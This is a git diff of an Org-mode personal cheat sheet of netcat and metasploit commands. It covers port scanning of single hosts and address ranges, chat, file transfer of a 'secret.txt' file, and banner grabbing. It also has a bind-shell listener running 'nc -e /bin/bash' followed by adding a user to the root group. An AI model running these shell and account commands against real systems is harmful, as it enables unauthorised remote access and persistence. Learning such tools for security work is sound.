@@ -151,48 +151,83 @@ $ nc -u <host> <port>
 $ arping [ip address]
 #+end_src 
 
-* port scan using =netcat= 
+* netcat
+** port scan using =netcat= 
 
+ #+begin_src shell 
+ $ netcat -z -v domain.com 1-1000
+ #ou can then use the -n flag to specify that you do not need to resolve the IP address using DNS:
+ $ netcat -z -n -v 111.111.111.111 1-1000
+ $ netcat -z -n -v 111.111.111.111 1-1000 2>&1 | grep succeeded
+ # to randomized port scanning use -r switch
+ $ nc –v –r –w 1 192.168.0.10 –z 1-1000
+ # scanning a range of devices
+ $ for i in {10..12}; do nc –vv –n –w 1 192.168.0.$i 21-25 –z; done
+ #+end_src
+
+** communicate through =netcat=
+
+ On one machine, you can tell netcat to listen to a specific port for
+ connections. We can do this by providing the -l parameter and choosing a port:
+
+ #+begin_src shell 
+ netcat -l 4444
+ #+end_src
+
+ This will tell netcat to listen for TCP connections on port 4444
+
+ On a second server, we can connect to the first machine on the port number we
+ choose. We do this the same way we've been establishing connections previously:
+
+ #+begin_src shell 
+ netcat domain.com 4444
+ #+end_src 
+
+ It will look as if nothing has happened. However, you can now send messages on
+ either side of the connection and they will be seen on either end.
+** =netcat= chat interface
+
+ #+begin_src shell 
+ $ nc -l -p 4444         # host ip 192.168.1.102
+ $ nc 192.168.1.102 4444
+ #+end_src 
+
+** transfering data with =netcat=
+
+ #+begin_src shell 
+ # server +++ -w 30 wait for 30 seconds 
+ $ nc –v –w 30 –p 31337 –l < secret.txt
+ # client
+ $ nc –v –w 2 192.168.0.10 31337 > secret.txt
+ #+end_src 
+
+** banner grabbing
+
+ #+begin_src shell 
+ $ nc 192.168.1.1 80
+ #+end_src 
+
+** Linux remote shell 
+
+ to prepare the listener we will type the following command into the command
+ line:
+
+ #+begin_src shell 
+ $ sudo nc –lp 31337 –e /bin/bash
+ #Connecting to the target
+ $ nc 192.168.0.11 31337
+ # Adding a local user and placing into the root group
+ $ useradd –g root bob
+ #+end_src 
+
+
+* metasploit
+** init
+   
 #+begin_src shell 
-$ netcat -z -v domain.com 1-1000
-
-#ou can then use the -n flag to specify that you do not need to resolve the IP address using DNS:
-netcat -z -n -v 111.111.111.111 1-1000
-
-netcat -z -n -v 111.111.111.111 1-1000 2>&1 | grep succeeded
-#+end_src
-
-* communicate through =netcat=
-
-On one machine, you can tell netcat to listen to a specific port for
-connections. We can do this by providing the -l parameter and choosing a port:
-
-#+begin_src shell 
-netcat -l 4444
-#+end_src
-
-This will tell netcat to listen for TCP connections on port 4444
-
-On a second server, we can connect to the first machine on the port number we
-choose. We do this the same way we've been establishing connections previously:
-
-#+begin_src shell 
-netcat domain.com 4444
+$ service postgresql start
+$ service metasploit start
+$ msfconsole
 #+end_src 
 
-It will look as if nothing has happened. However, you can now send messages on
-either side of the connection and they will be seen on either end.
-* =netcat= chat interface
 
-#+begin_src shell 
-$ nc -l -p 4444         # host ip 192.168.1.102
-$ nc 192.168.1.102 4444
-#+end_src 
-* transfering data with =netcat=
-
-#+begin_src shell 
-# server +++ -w 30 wait for 30 seconds 
-$ nc –v –w 30 –p 31337 –l < secret.txt
-# client
-$ nc –v –w 2 192.168.0.10 31337 > secret.txt
-#+end_src 
